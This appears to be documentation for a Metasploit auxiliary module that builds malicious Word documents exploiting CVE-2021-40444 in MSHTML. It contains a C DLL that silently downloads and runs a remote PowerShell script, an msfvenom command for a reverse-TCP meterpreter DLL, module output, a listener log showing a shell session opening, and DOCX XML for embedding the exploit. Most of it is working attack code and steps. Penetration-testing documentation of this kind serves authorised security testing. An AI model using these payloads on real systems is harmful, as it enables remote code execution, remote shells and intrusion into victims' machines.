This vulnerability is known as CVE-2021-40444, the exploitation of which allows malicious code to be executed remotely.

The vulnerability reside in MSHTML (the Internet Explorer engine). So few people use Internet Explorer these days (and
Microsoft strongly recommends using its new Edge browser), the old browser is still a component of modern operating systems
and some programs use its engine to manage Web content.

Some Microsoft Office applications, like Word or PowerPoint, are very dependent.

## Vulnerable Application

The malicious document exploiting CVE-2021-40444 loads remote HTML code with active JavaScript.

The attacking code dynamically creates a new HTMLFile ActiveX object in-memory and injects into it JavaScript code that
loads an HTML ActiveX installation object. The new object downloads a remote compressed .cab archive.

The cab archive hide  a file which is supposed to describe the object’s installation parameters, but in this case is
used to disguise the DLL payload.

### Make your lab

You need official version of Microsoft Office installed (using a valid licence). And stay unpatched for this.

The exploitation don't work on unlicensed version.

Tested on Microsoft Windows 10 1909 w/ Microsoft Office Word 2016.

## Verification Steps

1. Start `msfconsole`
2. `use auxiliary/docx/word_mshtml_injector`
3. `use PAYLOAD_DLL [PATH]`
4. `set SRVHOST [IP] || [HOSTNAME]`
5. `run`

## Options

**CUSTOMTEMPLATE**

A DOCX file that will be used as a template to build the exploit.

**OBFUSCATE**

Obfuscate JavaScript content. Default: true

**PAYLOAD_DLL**

The DLL payload file path to run.

**PAYLOAD_PREFIX**

The payload prefix to be requested by the exploit chain. Default: Randomized

**PAYLOAD_URI**

The payload base path to be requested by the exploit chain. Default: /

**SRVHOST**

The remote host/ip to request the payload.

**SRVPORT**

The remote host port number (TCP).

## Scenarios

### Basic usage

#### Generate your own DLL payload.

1. Using your own code

```
#include <windows.h>

void execute(void) {
	system("powershell -exec bypass -w hidden -C \"IEX(New-Object Net.WebClient).downloadString('https://www.domain.tld/folder/SCRIPT')\"");

	return;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {
    switch( fdwReason ) {
        case DLL_PROCESS_ATTACH:
           execute();
           break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
```

Make it: `i686-w64-mingw32-gcc -shared execute_cmd.c -o execute_cmd.dll`

2. Using `msfvenom` to generate the DLL payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=172.20.7.36 LPORT=4444 -f dll > /tmp/meterpreter.dll
```

#### Generate exloit files

```
msf6 auxiliary(docx/word_mshtml_injector) > use auxiliary/docx/word_mshtml_injector
msf6 auxiliary(docx/word_mshtml_injector) > set payload_dll /tmp/meterpreter.dll
payload_dll => /tmp/meterpreter.dll
msf6 auxiliary(docx/word_mshtml_injector) > set srvhost www.domain.tld
srvhost => www.domain.tld
msf6 auxiliary(docx/word_mshtml_injector) > set verbose true 
verbose => true
msf6 auxiliary(docx/word_mshtml_injector) > run

[*] CVE-2021-40444: Generate a malicious cabinet file
[*] Data block added w/ checksum: da25c9bd
[+] LgxqWUP.cab stored at /home/mekhalleh/.msf4/local/LgxqWUP.cab
[*] CVE-2021-40444: Generate a malicious html file
    - obfuscate JavaScript content
[+] LgxqWUP.html stored at /home/mekhalleh/.msf4/local/LgxqWUP.html
[*] CVE-2021-40444: Generate a malicious docx file
    - using template '/opt/metasploit/data/exploits/cve-2021-40444.docx'
[*] Parsing item from template: [Content_Types].xml
[*] Parsing item from template: _rels/
[*] Parsing item from template: _rels/.rels
[*] Parsing item from template: docProps/
[*] Parsing item from template: docProps/core.xml
[*] Parsing item from template: docProps/app.xml
[*] Parsing item from template: word/
[*] Parsing item from template: word/theme/
[*] Parsing item from template: word/theme/theme1.xml
[*] Parsing item from template: word/styles.xml
[*] Parsing item from template: word/settings.xml
[*] Parsing item from template: word/document.xml
[*] Parsing item from template: word/_rels/
[*] Parsing item from template: word/_rels/document.xml.rels
[*] Parsing item from template: word/fontTable.xml
[*] Parsing item from template: word/webSettings.xml
    - injecting payload in docx document
    - finalizing docx 'msf.docx'
[+] msf.docx stored at /home/mekhalleh/.msf4/local/msf.docx
[*] Auxiliary module execution completed
msf6 auxiliary(docx/word_mshtml_injector) > 
```

#### Hosting CAB and HTML files

Need to host the CAB and HTML as following:
 - https://www.domain.tld/LgxqWUP.cab
 - https://www.domain.tld/LgxqWUP.html

#### Run the DOCX payload on a vulnerable system.

In this example, using `msfvenom` for the payload creation. Create a listener:

```
msf6 exploit(multi/handler) > use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 172.20.7.36
lhost => 172.20.7.36
msf6 exploit(multi/handler) > run -j 
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 172.20.7.36:4444 

msf6 exploit(multi/handler) > 
```

Open the DOCX exploit on a vulnerable system.

```
msf6 exploit(multi/handler) > 
[*] Sending stage (200262 bytes) to 172.20.7.36
[*] Meterpreter session 1 opened (172.20.7.36:4444 -> 172.20.7.36:59038) at 2021-11-08 21:14:30 +0400

msf6 exploit(multi/handler) >
```

### Make your own DOCX template

You need to create new office document and personalizing it by your own model (CV, Report, ...).

The easy way, copy and paste (keep formating) from `data/exploits/cve-2021-40444.docx`.

You can copy this anywhere in the document.

Save the document and unpack this.

Check that `word/documment.xml` contains something like:

```
<w:object w:dxaOrig="4320" w:dyaOrig="4320">
  <v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f">
    <v:stroke joinstyle="miter"/>
    <v:formulas>
      <v:f eqn="if lineDrawn pixelLineWidth 0"/>
      <v:f eqn="sum @0 1 0"/>
      <v:f eqn="sum 0 0 @1"/>
      <v:f eqn="prod @2 1 2"/>
      <v:f eqn="prod @3 21600 pixelWidth"/>
      <v:f eqn="prod @3 21600 pixelHeight"/>
      <v:f eqn="sum @0 0 1"/>
      <v:f eqn="prod @6 1 2"/>
      <v:f eqn="prod @7 21600 pixelWidth"/>
      <v:f eqn="sum @8 21600 0"/>
      <v:f eqn="prod @7 21600 pixelHeight"/>
      <v:f eqn="sum @10 21600 0"/>
    </v:formulas>
    <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/>
    <o:lock v:ext="edit" aspectratio="t"/>
  </v:shapetype>
  <v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:3.75pt" o:ole="">
    <v:imagedata r:id="rId4" o:title="" cropbottom="64444f" cropright="64444f"/>
  </v:shape>
  <o:OLEObject Type="Link" ProgID="TARGET_HERE" ShapeID="_x0000_i1025" DrawAspect="Content" r:id="rId5" UpdateMode="OnCall">
    <o:LinkType>EnhancedMetaFile</o:LinkType>
    <o:LockedField>false</o:LockedField>
    <o:FieldCodes>\f 0</o:FieldCodes>
  </o:OLEObject>
</w:object>
```

Check that `word/_rels/document.xml.rels` have good relation to the above thing:

```
<Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="TARGET_HERE" TargetMode="External"/>
<Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="NULL" TargetMode="External"/>
```

Pack that to create word document to used as template.

## References

  1. <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444>
  2. <https://www.sentinelone.com/blog/peeking-into-cve-2021-40444-ms-office-zero-day-vulnerability-exploited-in-the-wild/>
  3. <http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/[ms-cab].pdf>
  4. <https://github.com/lockedbyte/CVE-2021-40444/blob/master/REPRODUCE.md>
  5. <https://github.com/klezVirus/CVE-2021-40444>
